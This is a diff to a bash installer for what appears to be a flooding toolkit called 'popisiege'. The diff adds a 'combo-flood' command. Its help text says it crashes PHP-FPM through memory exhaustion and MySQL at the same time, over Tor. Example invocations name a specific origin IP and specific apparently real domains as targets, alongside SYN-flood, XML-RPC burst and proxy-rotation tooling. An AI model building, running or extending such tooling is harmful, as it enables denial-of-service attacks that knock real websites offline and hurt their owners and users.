@@ -16,6 +16,7 @@ BIN_SYN="/usr/local/bin/syntest"
 BIN_HOME="/usr/local/bin/popihome"
 BIN_XMLRPC="/usr/local/bin/xmlrpc-burst"
 BIN_UPLOAD="/usr/local/bin/upload-burst"
+BIN_COMBO="/usr/local/bin/combo-flood"
 BACKBONE_CREDS="$INSTALL_DIR/proxies_webshare_backbone_creds.txt"
 
 echo ""
@@ -138,9 +139,16 @@ chmod +x "$BIN_XMLRPC"
 cat > "$BIN_UPLOAD" << EOF
 #!/usr/bin/env bash
 cd /opt/popisiege
-exec python3 upload_burst.py "\$@"
+exec python3 upload_flood.py "\$@"
 EOF
 chmod +x "$BIN_UPLOAD"
+
+cat > "$BIN_COMBO" << EOF
+#!/usr/bin/env bash
+cd /opt/popisiege
+exec python3 combo_flood.py "\$@"
+EOF
+chmod +x "$BIN_COMBO"
 
 echo ""
 echo "=============================="
@@ -182,6 +190,11 @@ echo "  Baseline control — no IP rotation, no UA rotation:"
 echo "    popitest1"
 echo "    popitest1 --concurrency 10 --verbose"
 echo "    popitest1 --profile firefox147   # hold a different single profile fixed"
+echo ""
+echo "  Combo Flood — PHP-FPM OOM + MySQL crash simultaneously (Tor):"
+echo "    combo-flood --origin 104.236.68.226 --host metoo-shatkin.com --form-id 50"
+echo "    combo-flood --origin <IP> --host metoo-buffalo.com --form-id 248"
+echo "    combo-flood --upload-workers 20 --search-workers 40 --size 7"
 echo ""
 echo "  SYN flood + service degradation monitor:"
 echo "    syntest --target <IP> --port 22 --rate 1000 --duration 30"
